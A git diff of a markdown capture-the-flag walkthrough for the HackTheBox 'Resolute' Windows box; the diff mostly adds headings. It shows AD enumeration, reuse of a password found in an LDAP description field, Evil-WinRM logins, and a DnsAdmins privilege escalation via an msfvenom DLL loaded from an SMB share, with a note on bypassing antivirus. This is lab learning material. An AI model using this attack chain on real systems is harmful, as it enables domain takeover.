@@ -1,6 +1,10 @@
 # HTB - Resolute
 
-First, as always...the nmap scan. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, `-oA <name>` saves all types of output \(`.nmap`,`.gnmap`, and `.xml`\) with filenames of `<name>`.
+## Enumeration
+
+### Nmap scan
+
+First, as always...I started with an nmap scan of `10.10.10.169`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, `-oA <name>` saves all types of output \(`.nmap`,`.gnmap`, and `.xml`\) with filenames of `<name>`.
 
 ```text
 zweilos@kalimaa:~/htb/resolute$ nmap -sC -sV -oA resolute 10.10.10.169
@@ -58,6 +62,8 @@ Nmap done: 1 IP address (1 host up) scanned in 185.35 seconds
 ```
 
 From these results we can see there are a lot of ports open! Since ports `88 - kerberos`, `135 & 139 - Remote Procedure Call`, `389 - LDAP`, and `445 - SMB` are all open it is safe to assume that this box is running Active Directory on a Windows machine. The host script also validates this by reporting to us that this is running `Windows Server 2016 Standard 14393`.
+
+### ldapsearch
 
 Since I had so many options, I decided to start by enumerating Active Directory through LDAP using `ldapsearch`. This command is built into many linux distros and returned a wealth of information. I snipped out huge chunks of the output in order to reduce information overload as most of it was not particularly interesting in this case.
 
@@ -1129,11 +1135,15 @@ objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
 dSCorePropagationData: 16010101000000.0Z
 ```
 
+### Interesting users/groups found
+
 There was no interesting information in the other users, but I made a list of their usernames, just in case. So far the interesting users were:
 
-* marko: has a potential password in his description field `Welcome123!`.
-* melanie: a member of the `Remote Management Users` group.
-* ryan: a member of the `Contractors` group, which is also a member of both the `Remote Management Users` and the `DnsAdmins` group.
+* **marko**: has a potential password in his description field `Welcome123!`.
+* **melanie**: a member of the `Remote Management Users` group.
+* **ryan**: a member of the `Contractors` group, which is also a member of both the `Remote Management Users` and the `DnsAdmins` group.
+
+### rpcclient
 
 Next I used `rpcclient` to validate the information I found through LDAP using the `enumdomusers` and `queryuser <rid>` RPC commands.
 
@@ -1200,7 +1210,11 @@ rpcclient $> queryuser 0x457
         logon_hrs[0..21]...
 ```
 
-Hmm...so the user `marko` has no home drive or profile path, and has never logged on. Maybe the user was only created on the domain but has no local account? I tried using his creds to enumerate SMB but got nothing back. I then tested his password with the users `ryan` and `melanie` and was able to get a share listing with `melanie:Welcome123!`! Thank you password reuse!
+Hmm...so the user `marko` has no home drive or profile path, and has never logged on. Maybe the user was only created on the domain but has no local account? 
+
+## Initial Foothold
+
+I tried using the creds for `marko` to enumerate SMB but got nothing back. I then tested his password with the users `ryan` and `melanie` and was able to get a share listing with `melanie:Welcome123!`Thank you password reuse!
 
 ```text
 zweilos@kalimaa:~/htb/resolute$ smbclient -U melanie -L //10.10.10.169/
@@ -1227,6 +1241,8 @@ smb: \> ls
 
                 10340607 blocks of size 4096. 7555454 blocks available
 ```
+
+## Road to User
 
 Since `melanie` is a member of the `Remote Management Users` group, I tried to log in through Windows Remote Management using the `Evil-WinRM` tool, which can be found at [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm).
 
@@ -1288,11 +1304,17 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 fc92144f24a8510dd36ac3aa890611ee
 ```
 
+### user.txt
+
 `whoami /all` didn't reveal any information that we didn't already know, so we will have to continue searching for useful things. I did find the user flag on `melanie`'s `\Desktop` though!
+
+## Path to Power \(Gaining Administrator Access\)
+
+### Enumeration as User
 
 Since we noticed the user `ryan` earlier had access to the `DnsAdmin` group, I figured that it would be good to search for any files with his name in it. Since we are in a Powershell environment, `Get-ChildItem` is the command we want. `ls` is a common alias to that command which is why the below command works. `-R` Makes the search recursive, `-Hidden` includes hidden files in the search, `-EA SilentlyContinue` is shorthand for `-ErrorAction Silently Continue` and specifies that we do not want to see any errors that result \(such as files or directories that we don't have access to\). `Select-String` is similar to the Linux `grep` command.
 
-```text
+```csharp
 *Evil-WinRM* PS C:\> ls -R -Hidden -EA SilentlyContinue | select-string ryan
 
 PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:4:Username: MEGABANK\ryan
@@ -1317,6 +1339,8 @@ Evil-WinRM shell v2.3
 
 Info: Establishing connection to remote endpoint
 ```
+
+### User \#2
 
 ```text
 *Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all
@@ -1366,14 +1390,14 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 *Evil-WinRM* PS C:\Users\ryan\Documents>
 ```
 
-Next I did a little research to see if the `DnsAdmins` group had any known privilege escalation routes, and found this interesting article describing how to escalate privileges by doing dll injection: [https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/](https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/). The author lists the steps to acomplish this as:
+### Privilege escalation
 
-```text
-1.Making a dll payload that sends a reverse shell back to our machine with msfvenom.
-2.Serving it using SMB Server to make it available to the Windows machine.
-3.Importing that dll in the DNS Server.
-4.Restarting the DNS Server so that it loads the dll file.
-```
+Next I did a little research to see if the `DnsAdmins` group had any known privilege escalation routes, and found this interesting article describing how to escalate privileges by doing dll injection: [https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/](https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/). The author lists the steps to accomplish this as:
+
+1. Making a dll payload that sends a reverse shell back to our machine with msfvenom.
+2. Serving it using SMB Server to make it available to the Windows machine.
+3. Importing that dll in the DNS Server.
+4. Restarting the DNS Server so that it loads the dll file.
 
 In my case, I was not able to get the dll injection to provide a reverse shell, so I came up with another route. I did use `msfvenom` to craft my dll to inject, but since the reverse shell payload failed, I decided to simply promote my current user account to `Domain Admin`.
 
@@ -1387,6 +1411,8 @@ No encoder or badchars specified, outputting raw payload
 Payload size: 311 bytes
 Final size of dll file: 5120 bytes
 ```
+
+#### Creating an SMB share from linux
 
 I then hosted my dll on an SMB share so I could access it from the Windows machine without transferring it fand storing it on the remote disk. This is useful for loading executables directly into memory to bypass AV. The Impacket python module library has an example smbserver that is ready-made to this. I created a share named `SHARE` from my local user's home directory with `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -debug SHARE ~/`
 
@@ -1409,7 +1435,7 @@ Registry property serverlevelplugindll successfully reset.
 Command completed successfully.
 ```
 
-According to the article, you next have to stop and restart the DNS service. You can do this using `sc.exe`. _\(Don't just type `sc` as this is an alias for `Set-Content` in Powershell and will not work.\)_
+According to the article, you next have to stop and restart the DNS service. You can do this using `sc.exe`_\(Don't just type `sc` as this is an alias for `Set-Content` in Powershell and will not work.\)_
 
 ```text
 *Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns
@@ -1436,7 +1462,7 @@ SERVICE_NAME: dns
         FLAGS              :
 ```
 
-Back at my SMB server, you can see the incoming connection from the `RESOLUTE` machine. The dll was only retrieved when the DNS service was restarted, so don't worry if you didn't see the request for the file when you ran the earlier command.
+Back at my SMB server, I saw the incoming connection from the `RESOLUTE` machine. _The dll was only retrieved when the DNS service was restarted, so don't worry if you don't see the request for the file when you run the earlier command._
 
 ```text
 zweilos@kalimaa:/usr/bin$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -debug SHARE ~/
@@ -1458,7 +1484,7 @@ Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corpo
 [*] Remaining connections []
 ```
 
-In order for the new permissions to take effect you have to log out of the user and log back in.
+In order for the new permissions to take effect I had to log out of the user and log back in.
 
 ```text
 *Evil-WinRM* PS C:\Users\ryan\Documents> exit
@@ -1471,6 +1497,10 @@ Evil-WinRM shell v2.3
 
 Info: Establishing connection to remote endpoint
 ```
+
+### Domain Admin
+
+After logging out and back in, I verified that the user `ryan` was indeed a member of the `Domain Admins` group and had the right privileges.
 
 ```text
 *Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all
@@ -1543,9 +1573,16 @@ USER CLAIMS INFORMATION
 User claims unknown.
 
 Kerberos support for Dynamic Access Control on this device has been disabled.
+```
+
+### root.txt
+
+After escalating to `Domain Admin` it was simple to find the root flag on the Administrator's `Desktop\`.  I did continue to run into one problem...other HTB users kept either resetting the box, or running the exploit themselves and in the process killing my shell.  It helps to know where the flag is and to grab it as quickly as possible!
+
+```text
 *Evil-WinRM* PS C:\Users\ryan\Documents> cat ../../Administrator/Desktop/root.txt
 ebdd1e01af7b2f1a53a1ef844a5d465c
 ```
 
-Thanks to [`egre55`](https://www.hackthebox.eu/home/users/profile/1190) for a fun and easy Windows box. I learned some new things while going though this one.
+Thanks to [`egre55`](https://www.hackthebox.eu/home/users/profile/1190) for a fun and easy Windows box. I did still learn some new things while going though this one.
 
